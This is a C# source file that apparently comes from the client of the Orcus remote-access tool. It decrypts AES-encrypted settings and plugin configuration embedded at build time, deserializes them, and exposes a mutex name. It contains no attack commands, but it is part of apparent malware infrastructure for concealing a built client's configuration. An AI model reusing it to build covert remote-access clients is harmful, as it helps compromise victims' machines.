using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Xml.Serialization;
using Orcus.Shared.Client;
using Orcus.Shared.Core;
using Orcus.Shared.Encryption;
using Orcus.Shared.Settings;

namespace Orcus.Config
{
    public static class Settings
    {
        // ReSharper disable once InconsistentNaming
        private static readonly List<IBuilderProperty> _settings;
        private static string _mutex;

        static Settings()
        {
            _settings = new List<IBuilderProperty>();

            var decryptedString = GetDecryptedSettings();
            var xmlSerializer = new XmlSerializer(typeof (ClientConfig),
                BuilderPropertyHelper.GetAllBuilderPropertyTypes());

            using (var stringReader = new StringReader(decryptedString))
                ClientConfig = (ClientConfig) xmlSerializer.Deserialize(stringReader);
        }

        public static ClientConfig ClientConfig { get; }

        public static string Mutex => _mutex ?? (_mutex = GetBuilderProperty<MutexBuilderProperty>().Mutex);

        public static T GetBuilderProperty<T>() where T : IBuilderProperty, new()
        {
            var existingSetting = _settings.OfType<T>().FirstOrDefault();
            if (existingSetting != null)
                return existingSetting;

            var builderProperty = ClientConfig.Settings.GetBuilderProperty<T>();
            _settings.Add(builderProperty);
            return builderProperty;
        }

        public static List<PluginSetting> GetPluginSettings(List<Type> requiredTypes)
        {
            var decryptedString = AES.Decrypt(SettingsData.PLUGINSETTINGS, SettingsData.SIGNATURE);
            var types = new List<Type>(BuilderPropertyHelper.GetAllBuilderPropertyTypes());
            types.AddRange(requiredTypes);

            var xmlSerializer = new XmlSerializer(typeof(List<ClientSetting>), types.ToArray());
            using (var stringReader = new StringReader(decryptedString))
                return (List<PluginSetting>) xmlSerializer.Deserialize(stringReader);
        }

        public static string GetDecryptedSettings()
        {
            return AES.Decrypt(SettingsData.SETTINGS, SettingsData.SIGNATURE);
        }
    }
}